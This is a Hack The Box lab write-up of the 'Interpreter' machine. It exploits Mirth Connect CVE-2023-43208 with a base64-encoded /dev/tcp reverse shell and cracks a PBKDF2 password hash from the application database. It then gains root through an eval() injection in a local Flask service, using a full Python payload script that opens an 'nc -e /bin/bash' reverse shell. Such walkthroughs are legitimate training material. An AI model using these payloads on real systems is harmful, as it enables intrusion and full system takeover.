---
date: 2026-06-01T04:05:00-05:00
# description: ""
image: "/images/HTB-Eighteen/Interpreter.png"
lastmod: 2026-06-01
showTableOfContents: true
tags: ["HackTheBox", "Labs", "Mirth", "PBKDF2", "CVE-2023-43208", "python-privesc", "eval"]
categories: ["Red Teaming"]
title: "HTB: Interpreter"
type: "post"
---

* Platform: Hack The Box
* Link: [Interpreter](https://app.hackthebox.com/machines/Interpreter)
* Level: Medium
* OS: Linux
---

Interpreter begins with the identification and enumeration of a Mirth Connect instance. Version analysis and vulnerability research lead to the discovery of `CVE-2023-43208`, which is leveraged to obtain initial access to the target system.

Post-exploitation enumeration reveals a configuration file containing database credentials. Access to the database allows the recovery of a PBKDF2-SHA256 password hash, which is reformatted and cracked to obtain the SSH password for a system user.

Further enumeration uncovers an internal service running with root privileges. Analysis of the service script identifies an insecure use of dynamic code evaluation, resulting in a code execution vulnerability. By exploiting this flaw, arbitrary commands are executed in the context of the root-owned process, ultimately leading to full system compromise.


# Scanning

```
nmap -p- --open -T4 -sCV -oA nmap/Interpreter <TARGET_IP>
```

**Results**
```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-29 07:01 EDT
Nmap scan report for interpreter.htb (10.129.244.184)
Host is up (0.11s latency).
Not shown: 64812 closed tcp ports (reset), 719 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp   open  http     Jetty
|_http-title: Mirth Connect Administrator
| http-methods: 
|_  Potentially risky methods: TRACE
443/tcp  open  ssl/http Jetty
|_http-title: Mirth Connect Administrator
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|_Not valid after:  2075-09-19T12:50:05
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 243.50 seconds
```


Nmap finds three open ports:
- 22 running SSH OpenSSH 9.2p1 Debian
- 80 running a Mirth Connect Administrator web server
- 443 running Mirth Connect Administrator with SSL encryption 

# Enumeration

> **Mirth Connect** is a software tool used mainly in healthcare to connect different systems and allow them to share data with each other.

[This](https://www.huntress.com/threat-library/vulnerabilities/cve-2023-43208?utm_source=chatgpt.com) Huntress article shows how to enumerate a Mirth Connect instance in order to find the running software version.

Using a curl request, version `4.4.0` is discovered.

```
curl -k \
  -H "X-Requested-With: XMLHttpRequest" \
  https://interpreter.htb/api/server/version
```

![Mirth version](/images/HTB-Interpreter/Mirth_version.png)

The search for this specific version vulnerabilities leads to the discovery of `CVE-2023-43208` with a PoC available [here](https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc/blob/master/CVE-2023-43208.py).

A url and a command are required to use the script.

1. Payload encoding
```
echo 'bash -i >& /dev/tcp/10.10.15.92/9001 0>&1' | base64
```

![base64 payload](/images/HTB-Interpreter/base64_rce.png)

2. Exploit execution
```
python3 CVE-2023-43208.py -u https://{TARGET_IP} -c "bash -c {echo,<BASE64_ENCODED_PAYLOAD>}|{base64,-d}|{bash,-i}"
```

![rce execution](/images/HTB-Interpreter/rce_execution.png)

# Initial Foothold

A shell is obtained on the listener.

![Interpreter Foothold](/images/HTB-Interpreter/foothold.png)

We upgrade it with the following commands:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
```

Linpeas shows a file called `mirth.properties`. This is the primary configuration file for Mirth Connect, containing settings for the server's database, ports, security, and directories.

![Mirth properties](/images/HTB-Interpreter/mirth_properties.png)

It contains database credentials for the instance.

![Mirth database credentials](/images/HTB-Interpreter/mirth_db_creds.png)

```
mysql -u mirthdb -p'MirthPass123!' -h localhost mc_bdd_prod
show tables;
```

The credentials seem to be stored separately, in the tables `PERSON` and `PERSON_PASSWORD`.

The content of the first table is dumped:
```
select * from PERSON;
```

![Mirth sedric user name](/images/HTB-Interpreter/mirth_sedric.png)

We find a username: `sedric`.

Next the content of the second table is dumped. And a password hash is recovered:

![Mirth sedric hash](/images/HTB-Interpreter/sedric_hash.png)

```
u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

## PBKDF2-SHA256 hash formatting

`mirth` uses the `PBKDF2-SHA256` algorithm. The same type of algorithm was featured in [HTB: Eighteen](https://scorpiosec.com/posts/htb-eighteen/#pbkdf2-hash).

![Mirth hash type](/images/HTB-Interpreter/mirth_hash_type.png)

Hashcat expects this format: 
```
<HASH_ALGORITHM>:<NUMBER_OF_ITERATIONS>:<base64_SALT>:<base64_hash>
```

The following command is used to format the hash correctly.

```
python3 -c "
import base64
data = base64.b64decode('u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==')
salt = base64.b64encode(data[:8]).decode()
hash_ = base64.b64encode(data[8:]).decode()
print(f'sha256:600000:{salt}:{hash_}')
"
```

![formating script](/images/HTB-Interpreter/format_script.png)

The complete hash is:
```
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

It is then cracked using hashcat:
```
hashcat -m 10900 sedric_hash.txt /usr/share/wordlists/rockyou.txt
```

The user password is recovered.
```
snowflake1
```

![sedric password](/images/HTB-Interpreter/sedric_pwd.png)

The user flag becomes accessible after logging in as `sedric` via SSH.

![sedric SSH login](/images/HTB-Interpreter/sedric_ssh.png)

# Privilege Escalation

In `/usr/local/bin/` we find a python script `notif.py`.

```Python
#!/usr/bin/env python3
"""
Notification server for added patients.
This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.
It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.
It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.
"""
from flask import Flask, request, abort
import re
import uuid
from datetime import datetime
import xml.etree.ElementTree as ET, os

app = Flask(__name__)
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # DOB format is DD/MM/YYYY
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    try:
        xml_text = request.data.decode()
        xml_root = ET.fromstring(xml_text)
    except ET.ParseError:
        return "XML ERROR\n", 400
    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    id = uuid.uuid4().hex
    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
    path = os.path.join(USER_DIR,f"{id}.txt")
    with open(path,"w") as f:
        f.write(notification+"\n")
    return notification

if __name__=="__main__":
    app.run("127.0.0.1",54321, threaded=True)
```

The output of `ps aux | grep notif.py` shows that it is running as `root` and uses port `54321` (the port number is also mentioned in the script).

![Interpreter processes](/images/HTB-Interpreter/processes.png)

## `notif.py` analysis

`notif.py` contains an unsafe eval() on user-controlled XML data. The `/addPatient` endpoint accepts XML, extracts fields like firstname, lastname, sender_app, birth_date, and gender, then passes them into `template()`.

The vulnerable part is as below:
```Python
template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
return eval(f"f'''{template}'''")
```

Because `first` is inserted into a Python f-string and then evaluated with `eval()`, anything placed inside `{ ... }` in the firstname field becomes executable Python code.

> NOTE: Any parameter inserted into `template` before the `eval()` can be abused, not only `first`.

It only accepts requests from `127.0.0.1`.

```python
if request.remote_addr != "127.0.0.1":
    abort(403)
```

## Malicious Script

The script below is used to obtain a root shell.

```python
#!/usr/bin/env python3
import urllib.request
import base64

TARGET_URL = "http://127.0.0.1:54321/addPatient"
LHOST = "YOUR_IP"
LPORT = PORT_NUMBER

cmd = f"nc {LHOST} {LPORT} -e /bin/bash"

b64_cmd = base64.b64encode(cmd.encode()).decode()

xml = f"""
<patient>
  <timestamp>20250101120000</timestamp>
  <sender_app>TEST</sender_app>
  <id>12345</id>
  <firstname>{{__import__("os").system(__import__("base64").b64decode("{b64_cmd}").decode())}}</firstname>
  <lastname>Doe</lastname>
  <birth_date>01/01/1990</birth_date>
  <gender>M</gender>
</patient>
"""

req = urllib.request.Request(
    TARGET_URL,
    data=xml.encode(),
    headers={"Content-Type": "application/xml"}
)

urllib.request.urlopen(req)
print("[+] Payload sent, check your listener")
```

It sends this malicious firstname:
```python
{__import__("os").system(__import__("base64").b64decode("...").decode())}
```

That code imports `os`, decodes the Base64 command, and executes it with `os.system()`.

The decoded command is essentially:
```
nc YOUR_IP PORT_NUMBER -e /bin/bash
```

So when `notif.py` evaluates the f-string, it executes the netcat reverse shell as the user running `notif.py`. Since the service on port `54321` is running as root, the reverse shell connects back to your listener as `root`.


## Exploitation

In orde to reach the internal service an SSH tunnel is set up.

```
ssh -L 54321:127.0.0.1:54321 sedric@interpreter.htb
```

After execution of the malicious script we get a shell.

![Interpreter root shell](/images/HTB-Interpreter/interpreter_root.png)


